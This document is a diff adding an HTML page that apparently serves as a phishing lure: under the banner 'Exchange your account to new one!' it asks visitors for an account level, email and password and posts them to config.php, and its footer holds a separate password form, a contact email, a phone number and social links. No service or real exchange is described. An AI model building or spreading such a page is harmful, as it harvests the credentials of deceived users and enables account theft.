@@ -1,0 +1,58 @@
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <link rel="stylesheet" href="/style/style.css">
+  <title>MRABDUMUTOLIB</title>
+  <link rel="shortcut icon" href="/sources/favicon.jpg" type="image/x-icon">
+</head>
+<body>
+  <img src="/sources/BG.jpg" alt="Reload page" width="100%" height="100%" style="z-index: -1;">
+  <div class="box">
+    <h2>Exchange your account to new one!</h2>
+    <form action="config.php" method="post">
+      <div class="input-box">
+        <input type="number" max="100" min="35" name="level" id="daraja" autocomplete="off" required title="Level of your account!">
+        <label for="daraja">Level of account?</label>
+      </div>
+      <div class="input-box">
+        <input type="email" name="email" id="pochta" autocomplete="off" required title="Email of your account!">
+        <label for="pochta">Email</label>
+      </div>
+      <div class="input-box">
+        <input type="password" minlength="7" name="password" id="kod" autocomplete="off" required title="Password of your account!">
+        <label for="kod">Password</label>
+        <img class="icon" src="/sources/eye-close.png" alt=" " id="eyeicon">
+      </div>
+        <center><input type="submit" value="Exchange" title="This site doesn't support banned or limit accounts!!!"></center>
+    </form>
+  </div>
+  <script src="/js/script.js"></script>
+</body>
+<footer>
+<div class="logo">
+  <img class="Logo" src="/sources/favicon.jpg" alt="Please reload page!">
+  <h3>MRABDUMUTOLIB</h3>
+  <img id="svg" src="/sources/tm.png" alt="Please reload page!" type="image/png">
+</div>
+<div class="questions">
+  <a class="mail" href="mailto:mrabdumutolib77@gmail.com">mrabdumutolib77@gmail.com</a><br>
+  <a class="phone" href="tel:+998913231985">+998913231985</a>
+</div>
+<div class="go-down">
+<form action="/check_password.php" method="post">
+    <input type="password" name="pasword" id="pasword" required placeholder="password" title="Password" minlength="8">
+    <br>
+    <center><button type="submit" id="kirish" title="Enter">Enter</button></center>
+</form>
+</div>
+<div class="icons">
+  <li>
+    <ol><a href="https://www.instagram.com/mrabdumutolib" target="_self" rel="noopener noreferrer"><img class="img" src="/sources/instagram.jpg" alt=" "></a></ol>
+    <ol><a href="http://t.me/mrabdumutolib_official" target="_self" rel="noopener noreferrer"><img class="img" src="/sources/telegram.jpg" alt=" "></a></ol>
+    <ol><a href="https://www.youtube.com/channel/UCQ_rb-1TwUIp3p4n_MTMFoQ" target="_self" rel="noopener noreferrer"><img class="img" src="/sources/youtube.png" alt=" "></a></ol>
+  </li>
+</div>
+</footer>
+</html>
